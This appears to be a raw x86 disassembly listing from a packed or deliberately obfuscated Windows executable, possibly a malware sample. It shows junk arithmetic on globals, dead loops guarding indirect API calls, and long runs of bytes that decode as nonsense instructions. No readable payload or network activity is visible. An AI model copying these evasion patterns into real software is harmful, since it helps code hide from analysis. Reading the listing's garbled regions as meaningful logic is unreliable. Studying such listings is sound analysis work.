  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x78e817cb
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	jae    0x40942d
  409490:	or     edx,DWORD PTR [edx+0x60]
  409493:	adc    ebx,DWORD PTR [ebx]
  409495:	sbb    esp,0x87174fcd
  40949b:	loop   0x40950c
  40949d:	jae    0x4094e9
  40949f:	ja     0x40948f
  4094a1:	sub    DWORD PTR [edi-0x66599d6a],eax
  4094a7:	je     0x40948a
  4094a9:	mov    ecx,0xd9da2df9
  4094ae:	sbb    al,0x7
  4094b0:	stos   DWORD PTR es:[edi],eax
  4094b1:	jb     0x409455
  4094b3:	js     0x409505
  4094b5:	mov    al,0x47
  4094b7:	jmp    0xe59f5847
  4094bc:	rcr    BYTE PTR ds:0xfe228683,1
  4094c2:	dec    esp
  4094c3:	cmp    cl,bh
  4094c5:	aaa    
  4094c6:	test   BYTE PTR [ecx-0x18],dl
  4094c9:	push   0x21a1be5b
  4094ce:	iret   
  4094cf:	in     al,0x17
  4094d1:	bound  esi,QWORD PTR [esi]
  4094d3:	jl     0x40945b
  4094d5:	adc    al,0x52
  4094d7:	pop    ds
  4094d8:	gs (bad) 
  4094da:	in     eax,dx
  4094db:	dec    edx
  4094dc:	int3   
  4094dd:	fwait
  4094de:	push   0x7d892b45
  4094e3:	push   0xe6e7275a
  4094e8:	das    
  4094e9:	test   DWORD PTR [ebx],edx
  4094eb:	dec    ecx
  4094ec:	xchg   ebx,eax
  4094ed:	int3   
  4094ee:	cli    
  4094ef:	adc    eax,0xd6c1b147
  4094f4:	outs   dx,DWORD PTR ds:[esi]
  4094f5:	lds    eax,FWORD PTR [eax]
  4094f7:	leave  
  4094f8:	in     eax,dx
  4094f9:	jge    0x4094a5
  4094fb:	outs   dx,DWORD PTR ds:[esi]
  4094fc:	dec    edx
  4094fd:	in     eax,dx
  4094fe:	pop    esp
  4094ff:	mov    BYTE PTR [edx],ch
  409501:	js     0x409486
  409503:	inc    edx
  409504:	ds popa 
  409506:	fcomi  st,st(7)
  409508:	add    eax,0x9a693067
  40950d:	sbb    DWORD PTR [ebx-0x421a921],ecx
  409513:	aaa    
  409514:	dec    eax
  409515:	bound  edi,QWORD PTR [eax-0x16]
  409518:	sub    bh,BYTE PTR [edi]
  40951a:	das    
  40951b:	sahf   
  40951c:	mov    eax,0x1c733703
  409521:	adc    BYTE PTR [ebx+0x46891075],cl
  409527:	adc    BYTE PTR [ebx+0x8458bc0],cl
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    al,BYTE PTR [ebp+0x9772161]
  409543:	and    DWORD PTR [esi+0x7e],edi
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	aam    0xf3
  40954c:	out    0x7,al
  40954e:	mov    dl,0x60
  409550:	push   cs
  409551:	xor    al,0x6a
  409553:	fwait
  409554:	pop    ebx
  409555:	dec    edi
  409556:	lock nop
  409558:	mov    ds:0x8eef2e88,al
  40955d:	adc    esi,DWORD PTR [esi+0x76dcf82]
  409563:	xchg   edx,eax
  409564:	in     al,dx
  409565:	dec    edx
  409566:	cld    
  409567:	out    0x8d,eax
  409569:	icebp  
  40956a:	ds aad 0x2e
  40956d:	pop    ebp
  40956e:	or     DWORD PTR [ebp+esi*4+0x14],ecx
  409572:	push   es
  409573:	xor    ebx,DWORD PTR [edx-0x71]
  409576:	jg     0x40955a
  409578:	neg    DWORD PTR [esi]
  40957a:	scas   al,BYTE PTR es:[edi]
  40957b:	imul   ebx,edi,0x5a
  40957e:	sbb    DWORD PTR [edx-0x31875e6d],ebx
  409584:	push   ebx
  409585:	ror    BYTE PTR [edx-0x222d88ac],0x64
  40958c:	and    eax,0x8e08f23f
  409591:	pop    eax
  409592:	pop    ss
  409593:	repnz push 0x1ac962c8
  409599:	mov    eax,ds:0x4a1bf145
  40959e:	dec    ecx
  40959f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095a0:	das    
  4095a1:	cmp    dh,BYTE PTR [ebx-0x5ed19bc9]
  4095a7:	int    0xc6
  4095a9:	push   esi
  4095aa:	xchg   ecx,eax
  4095ab:	pop    ecx
  4095ac:	repz js 0x409555
  4095af:	jnp    0x4095b1
  4095b1:	jp     0x409630
  4095b3:	in     eax,dx
  4095b4:	xor    dl,BYTE PTR [ebx]
  4095b6:	and    al,0xbd
  4095b8:	sub    ebp,DWORD PTR [esi+0x6a]
  4095bb:	cmc    
  4095bc:	aam    0xb9
  4095be:	dec    ebp
  4095bf:	cwde   
  4095c0:	pop    eax
  4095c1:	sub    dh,BYTE PTR [eax+edx*2]
  4095c4:	cld    
  4095c5:	xchg   ebp,eax
  4095c6:	inc    esi
  4095c7:	ins    BYTE PTR es:[edi],dx
  4095c8:	das    
  4095c9:	mov    edx,0xb6d9ba99
  4095ce:	arpl   WORD PTR [ecx-0x4e],dx
  4095d1:	shr    DWORD PTR [ebx-0x5d86f27e],1
  4095d7:	mov    ah,0x3e
  4095d9:	push   ds
  4095da:	(bad)
  4095de:	xor    eax,ecx
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    esi,DWORD PTR [eax+0x36]
  40961d:	and    DWORD PTR [edx+0x7e7e219d],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x409662
  409628:	addr16 pop esp
  40962a:	nop
  40962b:	addr16 daa 
  40962d:	repz jno 0x40965f
  409630:	in     al,0x1b
  409632:	pmulhuw mm2,mm0
  409635:	dec    esp
  409636:	dec    esi
  409637:	jno    0x4095bd
  409639:	jb     0x4095f1
  40963b:	js     0x409641
  40963d:	inc    esi
  40963e:	xor    al,0x98
  409640:	arpl   WORD PTR [ecx-0x2],bp
  409643:	jle    0x4096b5
  409645:	mov    al,0x3a
  409647:	hlt    
  409648:	jmp    0x7364245
  40964d:	mov    bh,0xca
  40964f:	ja     0x4095fb
  409651:	pop    ecx
  409652:	inc    esi
  409653:	mov    dl,BYTE PTR [esi]
  409655:	or     bh,BYTE PTR [ecx+0x1]
  409658:	mov    ds:0x7f0115a0,al
  40965d:	inc    DWORD PTR [esi-0x46]
  409660:	add    ecx,DWORD PTR [edi+0x5e05d8d3]
  409666:	in     al,dx
  409667:	or     al,0x69
  409669:	jnp    0x4096bb
  40966b:	lds    edi,FWORD PTR [ecx]
  40966d:	jp     0x4096a5
  40966f:	mov    eax,ds:0xd1d15de4
  409674:	sbb    dl,BYTE PTR ds:0xa01ee5eb
  40967a:	jmp    0xd5b8:0xa13cdf6f
  409681:	int    0xfb
  409683:	ror    DWORD PTR [ebx],cl
  409685:	xchg   ecx,eax
  409686:	int    0x89
  409688:	or     DWORD PTR [ebp-0x176da20f],esp
  40968e:	outs   dx,DWORD PTR ds:[esi]
  40968f:	add    BYTE PTR ds:0x8155985f,ah
  409695:	pushf  
  409696:	adc    al,0x5
  409698:	jne    0x4096c1
  40969a:	push   cs
  40969b:	inc    ecx
  40969c:	sub    eax,0x183e9c93
  4096a1:	(bad)  
  4096a2:	loopne 0x40962e
  4096a4:	add    al,0xa0
  4096a6:	sbb    BYTE PTR [ebx-0x2a],bh
  4096a9:	bound  ebx,QWORD PTR [ebx]
  4096ab:	adc    bl,bl
  4096ad:	or     esp,DWORD PTR [edx+0x559d4418]
  4096b3:	mov    ebx,0xc8aeb23c
  4096b8:	dec    ebx
  4096b9:	mov    dl,0x4c
  4096bb:	ja     0x40971e
  4096bd:	(bad)  
  4096be:	and    cl,BYTE PTR [esi-0x37dbf47c]
  4096c4:	ds mov bl,0x80
  4096c7:	ror    DWORD PTR [edi+edi*2-0x24],0xfc
  4096cc:	sub    al,0xee
  4096ce:	inc    esi
  4096cf:	std    
  4096d0:	sub    eax,0xdfc2c35e
  4096d5:	xchg   edx,eax
  4096d6:	fldz   
  4096d8:	sbb    DWORD PTR [edx+0x0],esi
  4096db:	fadd   DWORD PTR [eax]
  4096dd:	ficom  WORD PTR [esi+0x5784fe8a]
  4096e3:	xor    eax,0x6b995ac5
  4096e8:	and    ebx,DWORD PTR [edx+0x6b]
  4096eb:	sbb    DWORD PTR [eax+eax*2],esp
  4096ee:	rol    BYTE PTR [edi+0x40523579],0x4b
  4096f5:	sub    eax,0x6a2bd50d
  4096fa:	xor    bh,BYTE PTR [eax-0x6f5a619c]
  409700:	loopne 0x4096c6
  409702:	push   esi
  409703:	popa   
  409704:	(bad)  
  409705:	aaa    
  409706:	ss hlt 
  409708:	push   ebx
  409709:	mov    ebx,0x7e378a1c
  40970e:	mov    ebx,DWORD PTR [edi]
  409710:	xchg   ebx,eax
  409711:	dec    esp
  409712:	sbb    BYTE PTR [ecx],dl
  409714:	dec    edi
  409715:	push   ss
  409716:	xchg   BYTE PTR [edx-0x17],dl
  409719:	pushf  
  40971a:	imul   ebx,DWORD PTR [ebp+0x40],0xffffffef
  40971e:	into   
  40971f:	sbb    eax,ebp
  409721:	test   DWORD PTR [edi-0x1],edx
  409724:	imul   esp,eax,0xffffffcc
  409727:	out    dx,al
  409728:	or     BYTE PTR [edx-0x62],0x91
  40972c:	loopne 0x4097a2
  40972e:	aad    0xd2
  409730:	mov    ah,0x10
  409732:	imul   ebx,DWORD PTR [ecx+0x3720c8d9],0xb
  409739:	hlt    
  40973a:	clc    
  40973b:	sub    BYTE PTR [ecx-0x3d1ea439],bh
  409741:	cli    
  409742:	out    0xc,al
  409744:	int    0x13
  409746:	fsubr  DWORD PTR [edx]
  409748:	daa    
  409749:	shl    DWORD PTR [ebp-0x7ea75f02],cl
  40974f:	push   ecx
  409750:	sbb    edx,eax
  409752:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409759:	or     DWORD PTR ds:0x4245ae,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4245ca,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4245ba
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	pop    edx
  4097c0:	retf   
  4097c1:	push   ebp
  4097c2:	jae    0x409779
  4097c4:	es jle 0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x4097d6
  4097cc:	cmc    
  4097cd:	and    BYTE PTR [ebx+0x1d],ah
  4097d0:	push   esi
  4097d1:	jecxz  0x40984a
  4097d3:	push   ss
  4097d4:	jns    0x4097c6
  4097d6:	pop    esi
  4097d7:	loop   0x40984a
  4097d9:	out    dx,al
  4097da:	shl    BYTE PTR [eax-0x9],cl
  4097dd:	test   eax,0x32657a6f
  4097e2:	xchg   ebx,eax
  4097e3:	imul   edi,DWORD PTR [esi],0xffffff9f
  4097e6:	aaa    
  4097e7:	retf   
  4097e8:	test   al,0x9c
  4097ea:	or     BYTE PTR [esi],0x15
  4097ed:	shl    ch,cl
  4097ef:	mov    dl,0xd3
  4097f1:	into   
  4097f2:	cmc    
  4097f3:	ins    DWORD PTR es:[edi],dx
  4097f4:	inc    esi
  4097f5:	mov    al,0x61
  4097f7:	sbb    DWORD PTR [eax-0x26],0xf0f364c3
  4097fe:	mov    ebp,0x14817cad
  409803:	(bad)  
  409804:	or     BYTE PTR [ecx-0x4c],al
  409807:	jae    0x409881
  409809:	jp     0x4097dd
  40980b:	test   eax,0x4d9c25cd
  409810:	mov    al,0xe4
  409812:	fiadd  DWORD PTR [ebp+0x38eae944]
  409818:	cmp    eax,0x5dd6bc5d
  40981d:	aam    0xed
  40981f:	mov    bh,0x29
  409821:	inc    ecx
  409822:	push   esi
  409823:	push   ebx
  409824:	xchg   ebp,eax
  409825:	jge    0x409805
  409827:	outs   dx,DWORD PTR ds:[esi]
  409828:	sbb    ah,BYTE PTR [edi-0x2e9392fa]
  40982e:	and    al,0x96
  409830:	lods   al,BYTE PTR ds:[esi]
  409831:	data16 fwait
  409833:	xor    cl,BYTE PTR [edi+ebp*1-0x18]
  409837:	ret    
  409838:	nop
  409839:	ja     0x4098a6
  40983b:	mov    es,ecx
  40983d:	and    dh,BYTE PTR [ebp+0x1]
  409840:	dec    edi
  409841:	stos   DWORD PTR es:[edi],eax
  409842:	xor    dl,BYTE PTR ds:0x82847388
  409848:	adc    BYTE PTR [ebx+ebx*4-0xcce8bd6],dh
  40984f:	sbb    al,0x91
  409851:	pop    esp
  409852:	or     BYTE PTR [edi],cl
  409854:	fstp   TBYTE PTR [edx-0xd029f5d]
  40985a:	loopne 0x4097f5
  40985c:	lock xor ebx,eax
  40985f:	test   eax,0xed8d61f
  409864:	push   cs
  409865:	inc    ecx
  409866:	mov    ebp,0xb0cb7ce2
  40986b:	(bad)  
  40986c:	mov    ah,0x3a
  40986e:	in     eax,dx
  40986f:	dec    ecx
  409870:	daa    
  409871:	enter  0xbe9e,0x84
  409875:	xor    DWORD PTR [ecx],0x40fd070a
  40987b:	ds daa 
  40987d:	call   0xc17b:0xe83daa8e
  409884:	mov    ecx,0x6f941330
  409889:	add    ecx,DWORD PTR [edx-0x49bad3f4]
  40988f:	sub    DWORD PTR [edx-0x78],edi
  409892:	not    DWORD PTR [edi]
  409894:	(bad)  
  409895:	sti    
  409896:	test   eax,0x3137442b
  40989b:	sub    DWORD PTR ds:0x42cd9d56,edx
  4098a1:	pusha  
  4098a2:	mov    al,ds:0x30d5cf1f
  4098a7:	cmp    al,0x5
  4098a9:	xor    DWORD PTR [eax-0x4f7f021c],esi
  4098af:	pop    ebx
  4098b0:	cmovg  edx,DWORD PTR [edx-0x32]
  4098b4:	fisub  WORD PTR [ebx]
  4098b6:	push   es
  4098b7:	mov    cl,0x4b
  4098b9:	call   0xeecb:0xd9210bd4
  4098c0:	inc    ebp
  4098c1:	scas   eax,DWORD PTR es:[edi]
  4098c2:	cmp    al,0x84
  4098c4:	bound  edi,QWORD PTR [esi-0x387c02ef]
  4098ca:	or     BYTE PTR [edx-0x66],0x1b
  4098ce:	fild   DWORD PTR [eax+0x536cb191]
  4098d4:	adc    cl,al
  4098d6:	bound  eax,QWORD PTR [ebx]
  4098d8:	ret    0x7104
  4098db:	into   
  4098dc:	mov    al,ds:0xb9af38d9
  4098e1:	push   ds
  4098e2:	cs sbb edi,eax
  4098e5:	mov    esi,0x22d25d3d
  4098ea:	xchg   esi,eax
  4098eb:	into   
  4098ec:	test   al,0x7a
  4098ee:	cmc    
  4098ef:	(bad)  
  4098f0:	rol    ebp,cl
  4098f2:	cmp    al,0x8b
  4098f4:	inc    ebp
  4098f5:	adc    al,0x81
  4098f7:	and    eax,0x412364
  4098fc:	add    BYTE PTR [eax],al
  4098fe:	add    BYTE PTR [eax],al
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0x6405314c
  409977:	push   esp
  409978:	ins    DWORD PTR es:[edi],dx
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x40997f
  409981:	rcl    bl,cl
  409983:	pop    esi
  409984:	mov    esi,DWORD PTR [ebx+ebp*8-0x51]
  409988:	cli    
  409989:	mov    ds:0xe46b248f,al
  40998e:	cmp    esp,0x5ed78347
  409994:	jmp    0x409a09
  409996:	adc    eax,0x297c7377
  40999b:	shr    DWORD PTR [eax-0x4a],1
  40999e:	jl     0x4099ec
  4099a0:	mov    ebx,0x2dd9a9f5
  4099a5:	inc    edx
  4099a6:	xor    DWORD PTR [ebx+0x3af01fe0],0xffffff8b
  4099ad:	rcr    eax,cl
  4099af:	xor    eax,0x124a46bd
  4099b4:	out    0xbc,eax
  4099b6:	push   es
  4099b7:	fst    QWORD PTR [edi-0x49]
  4099ba:	lea    edi,[ecx]
  4099bc:	scas   eax,DWORD PTR es:[edi]
  4099bd:	test   DWORD PTR [eax],ebx
  4099bf:	inc    edx
  4099c0:	ja     0x409947
  4099c2:	not    dl
  4099c4:	push   edx
  4099c5:	rcl    BYTE PTR [edi+ebx*2],1
  4099c8:	bound  ecx,QWORD PTR [ecx]
  4099ca:	cmp    BYTE PTR [edi+esi*1],0x51
  4099ce:	test   eax,0x94609a2d
  4099d3:	mov    ebx,0x7c52a8f3
  4099d8:	loope  0x409a24
  4099da:	mov    al,ds:0x5136ac5d
  4099df:	jae    0x409a47
  4099e1:	mov    eax,ds:0xe0d29544
  4099e6:	or     cl,BYTE PTR [esi+eax*8+0x5b]
  4099ea:	adc    BYTE PTR [edi],dl
  4099ec:	dec    esp
  4099ed:	repz setg ah
  4099f1:	mov    DWORD PTR [ebx],ebp
  4099f3:	pop    es
  4099f4:	xchg   edx,eax
  4099f5:	ror    DWORD PTR [esi+edx*1+0x4b],1
  4099f9:	xor    bh,BYTE PTR [ebx+0x71f382fb]
  4099ff:	sbb    al,BYTE PTR [edx+eiz*8+0x56]
  409a03:	sub    ah,BYTE PTR [edx-0x30]
  409a06:	push   cs
  409a07:	pop    ecx
  409a08:	or     DWORD PTR [edi],esp
  409a0a:	(bad)  
  409a0b:	sbb    al,BYTE PTR [eax+0x6b]
  409a0e:	mov    dh,0x9e
  409a10:	gs cmc 
  409a12:	dec    esi
  409a13:	into   
  409a14:	call   0xd48d:0xa44f9c5b
  409a1b:	enter  0x4445,0xcd
  409a1f:	pop    eax
  409a20:	icebp  
  409a21:	fsub   DWORD PTR [esi+esi*8]
  409a24:	cmp    ch,BYTE PTR [ebp+0x1c]
  409a27:	sti    
  409a28:	(bad)  
  409a2a:	fnstsw WORD PTR [si+0x4f]
  409a2e:	fmul   DWORD PTR [edi+0x37fed344]
  409a34:	sbb    eax,0x871efa59
  409a39:	enter  0x113a,0x94
  409a3d:	and    DWORD PTR ds:0xe2177899,0xffffffca
  409a44:	loop   0x4099e6
  409a46:	loopne 0x409a92
  409a48:	cdq    
  409a49:	xor    al,0xcb
  409a4b:	sbb    BYTE PTR [ebp+0x78a82b29],ah
  409a51:	scas   eax,DWORD PTR es:[edi]
  409a52:	or     BYTE PTR [ebx+eiz*4],0x88
  409a56:	je     0x409a4f
  409a58:	jle    0x409a40
  409a5a:	mov    ds:0xae4e139a,al
  409a5f:	daa    
  409a60:	lock ret 
  409a62:	mov    esp,DWORD PTR [ebx+ebp*2-0x1ba8cc71]
  409a69:	pop    edi
  409a6a:	pop    ebp
  409a6b:	inc    esi
  409a6c:	or     dh,bh
  409a6e:	jmp    0xb4d8df7
  409a73:	pop    ss
  409a74:	les    edi,FWORD PTR [ebx+eax*1]
  409a77:	or     eax,0xbe6fd533
  409a7c:	xchg   esp,eax
  409a7d:	dec    ebx
  409a7e:	xor    DWORD PTR [ecx+0x4e68dd5c],edx
  409a84:	stos   BYTE PTR es:[edi],al
  409a85:	push   ds
  409a86:	sub    DWORD PTR ds:[edi+0x5e],eax
  409a8a:	mov    edx,DWORD PTR [eax]
  409a8c:	ss aas 
  409a8e:	aaa    
  409a8f:	xor    eax,0x6ca86d9c
  409a94:	xchg   edi,eax
  409a95:	nop
  409a96:	xchg   ebx,eax
  409a97:	test   DWORD PTR [esi+0x5e],ebx
  409a9a:	shl    DWORD PTR [edx],cl
  409a9c:	xchg   edx,eax
  409a9d:	xor    dl,BYTE PTR [eax+0x406903d8]
  409aa3:	or     esp,eax
  409aa5:	bound  edi,QWORD PTR [edx+0x73]
  409aa8:	mov    DWORD PTR [edx+0x8],eax
  409aab:	mov    eax,DWORD PTR [ebp+0x1c]
  409aae:	mov    edx,DWORD PTR [ebp+0x10]
  409ab1:	mov    DWORD PTR [edx+0xc],eax
  409ab4:	mov    eax,DWORD PTR [ebp+0x20]
  409ab7:	mov    edx,DWORD PTR [ebp+0x10]
  409aba:	mov    DWORD PTR [edx+0x10],eax
  409abd:	mov    eax,eax
  409abf:	mov    eax,DWORD PTR [ebp+0x14]
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4245b6
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4245c2,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4245c2,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4245b2
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4245c2,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4245b2,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4245ae
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
